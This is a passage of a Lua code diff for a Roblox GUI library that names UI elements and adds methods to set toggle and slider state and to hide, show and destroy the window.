+                textFrame.Name = "TextBlockFrame"
                 textFrame.Size = UDim2.new(1, 0, 0, height)
                 textFrame.Position = UDim2.new(0, 0, 0, currentY)
                 textFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -1738,6 +2251,7 @@ function Library:CreateLib(name, theme)
                 local currentY = tabData.YPosition
 
                 local inputFrame = Instance.new("Frame")
+                inputFrame.Name = "TextInputFrame"
                 inputFrame.Size = UDim2.new(1, 0, 0, 85)
                 inputFrame.Position = UDim2.new(0, 0, 0, currentY)
                 inputFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -1816,6 +2330,7 @@ function Library:CreateLib(name, theme)
                 local inputToggleId = tostring(math.random(10000, 99999))
 
                 local inputToggleFrame = Instance.new("Frame")
+                inputToggleFrame.Name = "InputToggleFrame"
                 inputToggleFrame.Size = UDim2.new(1, 0, 0, 85)
                 inputToggleFrame.Position = UDim2.new(0, 0, 0, currentY)
                 inputToggleFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -1862,6 +2377,7 @@ function Library:CreateLib(name, theme)
                 bgCorner.Parent = toggleBg
 
                 local toggleIndicator = Instance.new("Frame")
+                toggleIndicator.Name = "toggleIndicator"
                 toggleIndicator.Size = UDim2.new(0, 20, 0, 16)
                 toggleIndicator.Position = UDim2.new(0, 2, 0.5, -8)
                 toggleIndicator.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
@@ -1941,6 +2457,7 @@ function Library:CreateLib(name, theme)
                 local currentY = tabData.YPosition
 
                 local chatFrame = Instance.new("Frame")
+                chatFrame.Name = "ChatFrame"
                 chatFrame.Size = UDim2.new(1, 0, 0, 300)
                 chatFrame.Position = UDim2.new(0, 0, 0, currentY)
                 chatFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -1975,6 +2492,7 @@ function Library:CreateLib(name, theme)
                 descLabel.Parent = chatFrame
 
                 local messagesFrame = Instance.new("ScrollingFrame")
+                messagesFrame.Name = "MessagesFrame"
                 messagesFrame.Size = UDim2.new(1, -20, 0, 170)
                 messagesFrame.Position = UDim2.new(0, 10, 0, 48)
                 messagesFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
@@ -1999,6 +2517,7 @@ function Library:CreateLib(name, theme)
                 messagesPadding.Parent = messagesFrame
 
                 local nickBox = Instance.new("TextBox")
+                nickBox.Name = "NickBox"
                 nickBox.Size = UDim2.new(0.25, -5, 0, 26)
                 nickBox.Position = UDim2.new(0, 10, 0, 225)
                 nickBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -2019,6 +2538,7 @@ function Library:CreateLib(name, theme)
                 nbCorner.Parent = nickBox
 
                 local messageBox = Instance.new("TextBox")
+                messageBox.Name = "MessageBox"
                 messageBox.Size = UDim2.new(0.55, -10, 0, 26)
                 messageBox.Position = UDim2.new(0.25, 15, 0, 225)
                 messageBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -2039,6 +2559,7 @@ function Library:CreateLib(name, theme)
                 mbCorner.Parent = messageBox
 
                 local sendButton = Instance.new("TextButton")
+                sendButton.Name = "SendButton"
                 sendButton.Size = UDim2.new(0.2, -10, 0, 26)
                 sendButton.Position = UDim2.new(0.8, 10, 0, 225)
                 sendButton.BackgroundColor3 = CurrentColor
@@ -2152,6 +2673,35 @@ function Library:CreateLib(name, theme)
 
     function Library:GetInputToggleState(id)
         return InputToggleStates[id] or {state = false, text = ""}
+    end
+
+    function Library:SetToggleState(id, value)
+        ToggleStates[id] = value
+    end
+
+    function Library:SetSliderValue(id, value)
+        SliderValues[id] = value
+    end
+
+    function Library:Destroy()
+        isScannerTheme = false
+        clearHackerLabels()
+        screenGui:Destroy()
+    end
+
+    function Library:Hide()
+        isHidden = true
+        savedPos = Vector2.new(mainFrame.AbsolutePosition.X, mainFrame.AbsolutePosition.Y)
+        savedSize = Vector2.new(mainFrame.AbsoluteSize.X, mainFrame.AbsoluteSize.Y)
+        mainFrame.Visible = false
+        mainFrame.Position = UDim2.new(0, -9999, 0, -9999)
+    end
+
+    function Library:Show()
+        isHidden = false
+        mainFrame.Visible = true
+        mainFrame.Size = UDim2.new(0, savedSize.X, 0, savedSize.Y)
+        mainFrame.Position = UDim2.new(0, math.clamp(savedPos.X, 0, workspace.CurrentCamera.ViewportSize.X - savedSize.X), 0, math.clamp(savedPos.Y, 0, workspace.CurrentCamera.ViewportSize.Y - savedSize.Y))
     end
 
     return Library
